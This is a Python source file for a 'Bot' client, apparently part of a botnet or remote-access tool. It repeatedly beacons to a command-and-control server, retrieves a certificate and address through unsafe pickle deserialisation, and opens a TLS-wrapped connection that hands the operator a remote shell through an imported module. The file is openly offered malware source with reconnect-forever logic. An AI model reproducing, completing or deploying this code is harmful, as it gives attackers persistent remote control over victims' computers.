# Date: 06/04/2018
# Author: Pure-L0G1C
# Description: Bot 

import ssl
import json
import socket
import pickle
from time import sleep 
from os import getcwd, path
from lib import shell, session

# wait before calling server
# sleep(30)

# cert path
config = {
  'cert_path': 'public.crt'
}

config_file = 'config.json'

if not path.exists(config_file):
 with open(config_file, 'wt') as f:
  json.dump(config, f)

class Bot(object):
 
 def __init__(self, home):
  self.cert = self.cert_path 
  self.home = home
  self.conn = None 
  self.port = None 
  self.ip = None

 @property 
 def cert_path(self):
  if path.exists(config_file):
   with open(config_file, 'rt') as f:
    return json.load(f)['cert_path']

 def shutdown(self):
  try:
   self.conn.shutdown(socket.SHUT_RDWR)
   self.conn.close()
  except:pass

 def connect(self):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(10)

  self.conn = ssl.wrap_socket(sock, ca_certs=self.cert, cert_reqs=ssl.CERT_REQUIRED)
  s = session.Session(self.conn)
  services = s.connect(self.ip, self.port, 2)
  if not services:
   self.ip, self.port, self.is_active = None, None, False
   self.display_text('Error: Server is unavailable, trying again in a bit')
  else:
   _shell = shell.Shell(s, services['args'], self.home)
   self.is_active = True
   _shell.shell()

 def get_cert(self):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s = session.Session(sock)
  resp = s.connect(self.ip, self.port, 1)
  if resp:
   resp = pickle.loads(resp)
   with open(self.cert, 'wb') as f:
    self.port = resp['port']
    self.ip = resp['ip']
    f.write(resp['cert'])
  s.shutdown() 
  if resp:
   return True 

 # -------- UI -------- #

 def display_text(self, text):
  print('{0}{1}{0}'.format('\n\n\t', text))

 def contact_server(self, ip, port):
  self.ip, self.port = ip, int(port)
  try:
   if self.get_cert():
    sleep(1.5)
    self.connect()
  except Exception as e:
   print('bot(1) Error: {}'.format(e))
   self.shutdown()

if  __name__ == '__main__':
 home = getcwd()
 while True:
  bot = Bot(home)
  bot.contact_server('127.0.0.1', 8080)
  bot.shutdown()
  try:sleep(10)
  except:break
  del bot 